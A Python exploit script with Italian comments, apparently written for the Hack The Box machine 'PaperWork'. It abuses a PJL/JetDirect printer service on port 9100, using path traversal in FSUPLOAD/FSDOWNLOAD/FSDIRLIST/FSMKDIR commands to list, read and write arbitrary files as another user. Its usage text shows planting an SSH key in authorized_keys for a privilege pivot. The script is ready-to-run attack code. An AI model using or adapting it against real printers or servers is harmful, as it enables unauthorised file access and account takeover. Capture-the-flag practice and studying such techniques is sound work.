#!/usr/bin/env python3
"""
Helper per il pivot lp -> archivist tramite il servizio JetDirect/PJL della
macchina HTB "PaperWork".

Sul target gira, come utente 'archivist', un emulatore di stampante
"HP LASERJET 4ML" su 127.0.0.1:9100 (jetdirect.py). Espone un filesystem PJL
in READ-WRITE (volume 0:). Con FSUPLOAD/FSDOWNLOAD + path traversal si
leggono/scrivono file COME ARCHIVIST.

Va eseguito DAL target (dalla reverse shell come 'lp'), perche' la 9100 e' in
ascolto solo su 127.0.0.1. In alternativa, tunnel SSH e puntare a localhost.

Uso (dalla shell 'lp' sul target):
    # leggere un file come archivist (prova piu' sintassi di traversal)
    python3 pjl_pwn.py read /home/archivist/user.txt
    # scrivere un file come archivist (es. la propria chiave SSH)
    python3 pjl_pwn.py write /home/archivist/.ssh/authorized_keys "ssh-ed25519 AAAA... kali"
    # elencare il volume
    python3 pjl_pwn.py ls
"""

import socket
import sys

HOST, PORT = "127.0.0.1", 9100
UEL = b"\x1b%-12345X"

# Il volume 0: mappa la working dir della stampante (/home/archivist/printer/).
# Proviamo varie codifiche del path perche' l'implementazione custom potrebbe
# accettare backslash o slash e vari livelli di ../
def traversals(abs_path: str):
    rel = abs_path.lstrip("/")
    up = "../" * 8
    return [
        f"0:/{up}{rel}",
        "0:\\" + ("..\\" * 8) + rel.replace("/", "\\"),
        f"{up}{rel}",
        abs_path,
        f"0:{abs_path}",
    ]


def pjl(payload: bytes, t=3) -> str:
    s = socket.socket()
    s.settimeout(t)
    s.connect((HOST, PORT))
    s.sendall(payload)
    out = b""
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            out += b
    except socket.timeout:
        pass
    s.close()
    return out.decode("latin1")


def do_ls():
    for p in ["0:\\", "0:/", "0:.", "1:\\"]:
        cmd = UEL + f'@PJL FSDIRLIST NAME="{p}" ENTRY=1 COUNT=100\r\n'.encode() + UEL
        print(f"### FSDIRLIST {p!r}")
        print(pjl(cmd))


def do_dir(path):
    """Elenca una directory arbitraria (via traversal)."""
    for p in traversals(path):
        cmd = UEL + f'@PJL FSDIRLIST NAME="{p}" ENTRY=1 COUNT=100\r\n'.encode() + UEL
        print(f"### FSDIRLIST {p!r}")
        print(pjl(cmd))
        print("-" * 40)


def do_mkdir(path):
    """Crea una directory come archivist (per es. ~/.ssh)."""
    for p in traversals(path):
        cmd = UEL + f'@PJL FSMKDIR NAME="{p}"\r\n'.encode() + UEL
        print(f"### FSMKDIR {p!r}")
        print(pjl(cmd))
        print("-" * 40)


def do_read(path):
    for p in traversals(path):
        cmd = UEL + f'@PJL FSUPLOAD NAME="{p}" OFFSET=0 SIZE=200000\r\n'.encode() + UEL
        resp = pjl(cmd)
        marker = f"### FSUPLOAD {p!r}"
        # se la risposta contiene dati "veri" (non solo eco/FILEERROR) la mostriamo
        print(marker)
        print(resp)
        print("-" * 40)


def do_write(path, content):
    data = content.encode() + b"\n"
    for p in traversals(path):
        # L'ordine DEVE essere NAME="..." SIZE=<n> (vincolo della regex del server).
        cmd = (UEL +
               f'@PJL FSDOWNLOAD NAME="{p}" SIZE={len(data)}\r\n'.encode() +
               data + UEL)
        print(f"### FSDOWNLOAD {p!r}")
        print(pjl(cmd))
        print("-" * 40)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    action = sys.argv[1]
    if action == "ls":
        do_ls()
    elif action == "dir" and len(sys.argv) >= 3:
        do_dir(sys.argv[2])
    elif action == "mkdir" and len(sys.argv) >= 3:
        do_mkdir(sys.argv[2])
    elif action == "read" and len(sys.argv) >= 3:
        do_read(sys.argv[2])
    elif action == "write" and len(sys.argv) >= 4:
        do_write(sys.argv[2], sys.argv[3])
    else:
        print(__doc__)


if __name__ == "__main__":
    main()
